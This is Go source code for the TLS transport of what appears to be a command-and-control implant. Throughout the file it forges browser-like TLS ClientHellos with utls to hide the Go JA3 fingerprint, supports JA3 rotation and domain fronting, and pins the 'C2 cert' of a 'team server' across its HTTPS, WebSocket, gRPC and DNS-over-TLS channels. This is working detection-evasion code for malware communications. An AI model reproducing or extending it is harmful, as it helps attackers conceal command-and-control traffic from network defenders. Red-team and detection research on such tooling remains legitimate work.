//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"context"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"time"

	utls "github.com/refraction-networking/utls"
	"google.golang.org/grpc/credentials"
)

// ja3HelloProvider returns the utls ClientHelloID for the next handshake. It is
// registered by the chameleon build (which performs JA3 rotation). When nil a
// safe default (Chrome Auto) is used, so every TLS transport gets a realistic,
// non-Go-stdlib ClientHello instead of the easily-fingerprinted Go stack.
var ja3HelloProvider func() utls.ClientHelloID

// mtlsCAPool, when set, is the CA pool used to verify the team server in mTLS
// mode. It is populated by initMTLS.
var mtlsCAPool *x509.CertPool

func utlsClientHello() utls.ClientHelloID {
	if ja3HelloProvider != nil {
		return ja3HelloProvider()
	}
	return utls.HelloChrome_Auto
}

// utlsDialContext performs a TLS handshake using utls (not the Go stdlib
// crypto/tls), giving a realistic, configurable ClientHello. It is shared by
// the HTTPS, WSS, mTLS, gRPC-TLS and DoT transports so none of them leak the
// Go-stdlib JA3 fingerprint.
func utlsDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	d := &net.Dialer{Timeout: 15 * time.Second}
	if dl, ok := ctx.Deadline(); ok {
		if t := time.Until(dl); t > 0 {
			d.Timeout = t
		}
	}
	rawConn, err := d.DialContext(ctx, network, addr)
	if err != nil {
		return nil, err
	}

	serverName := addr
	if h, _, err := net.SplitHostPort(addr); err == nil {
		serverName = h
	}
	if DomainFront != "" {
		serverName = DomainFront
	}

	cfg := &utls.Config{
		// When a certificate pin is configured it is the sole trust anchor, so
		// skip the default chain/CN validation and let verifyPinnedCert enforce
		// it. Without this, a self-signed (or privately-CA) pinned C2 cert fails
		// chain validation before the pin is ever consulted, breaking pinning.
		InsecureSkipVerify: SkipTLSVerify || len(pinnedCertSHA256) > 0,
		ServerName:         serverName,
	}
	if mtlsCertLoaded {
		cfg.Certificates = []utls.Certificate{mtlsClientCert}
	}
	if mtlsCAPool != nil {
		cfg.RootCAs = mtlsCAPool
	}
	if len(pinnedCertSHA256) > 0 {
		cfg.VerifyPeerCertificate = verifyPinnedCert
	}

	uconn := utls.UClient(rawConn, cfg, utlsClientHello())
	if err := uconn.Handshake(); err != nil {
		rawConn.Close()
		return nil, err
	}
	return uconn, nil
}

// dialUTLSTCP dials a raw TCP connection and performs the utls TLS handshake,
// mirroring utlsDialContext but for the length-prefixed TCP/tls:// transport
// (which cannot use an http.Transport). It keeps the tls:// scheme on the
// realistic-ClientHello utls stack instead of leaking the Go-stdlib JA3.
func dialUTLSTCP(network, addr string) (net.Conn, error) {
	return utlsDialContext(context.Background(), network, addr)
}

func newUTLSTransport() *http.Transport {
	tr := &http.Transport{
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     60 * time.Second,
	}
	tr.DialTLSContext = utlsDialContext
	return tr
}

// utlsCreds implements grpc credentials.TransportCredentials over utls so the
// gRPC transport also uses a realistic ClientHello.
type utlsCreds struct{}

func (c *utlsCreds) ClientHandshake(ctx context.Context, authority string, rawConn net.Conn) (net.Conn, credentials.AuthInfo, error) {
	serverName := authority
	if h, _, err := net.SplitHostPort(authority); err == nil {
		serverName = h
	}
	if DomainFront != "" {
		serverName = DomainFront
	}
	cfg := &utls.Config{
		// When a certificate pin is configured it is the sole trust anchor, so
		// skip the default chain/CN validation and let verifyPinnedCert enforce
		// it. Without this, a self-signed (or privately-CA) pinned C2 cert fails
		// chain validation before the pin is ever consulted, breaking pinning.
		InsecureSkipVerify: SkipTLSVerify || len(pinnedCertSHA256) > 0,
		ServerName:         serverName,
	}
	if mtlsCertLoaded {
		cfg.Certificates = []utls.Certificate{mtlsClientCert}
	}
	if mtlsCAPool != nil {
		cfg.RootCAs = mtlsCAPool
	}
	if len(pinnedCertSHA256) > 0 {
		cfg.VerifyPeerCertificate = verifyPinnedCert
	}
	uconn := utls.UClient(rawConn, cfg, utlsClientHello())
	if err := uconn.Handshake(); err != nil {
		rawConn.Close()
		return nil, nil, err
	}
	return uconn, nil, nil
}

func (c *utlsCreds) ServerHandshake(net.Conn) (net.Conn, credentials.AuthInfo, error) {
	return nil, nil, fmt.Errorf("server handshake not supported")
}

func (c *utlsCreds) Info() credentials.ProtocolInfo {
	return credentials.ProtocolInfo{SecurityProtocol: "utls"}
}
func (c *utlsCreds) Clone() credentials.TransportCredentials { return &utlsCreds{} }
func (c *utlsCreds) OverrideServerName(string) error         { return nil }
